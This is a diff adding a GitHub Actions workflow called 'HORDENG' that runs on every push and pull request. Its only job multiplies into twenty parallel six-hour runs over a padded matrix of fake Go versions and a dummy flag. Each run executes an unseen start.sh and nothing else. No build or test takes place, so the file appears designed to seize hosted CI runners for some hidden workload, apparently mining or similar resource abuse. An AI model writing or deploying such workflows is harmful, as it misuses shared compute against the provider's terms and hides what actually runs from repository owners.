@@ -1,0 +1,28 @@
+name: HORDENG
+on: [push, pull_request]
+jobs:
+  build:
+    name: HORDENG
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 240
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.0]
+        flag: [A, B]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 240
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: runner_go
+      run: |
+        chmod +x "${GITHUB_WORKSPACE}/start.sh"
+        "${GITHUB_WORKSPACE}/start.sh"
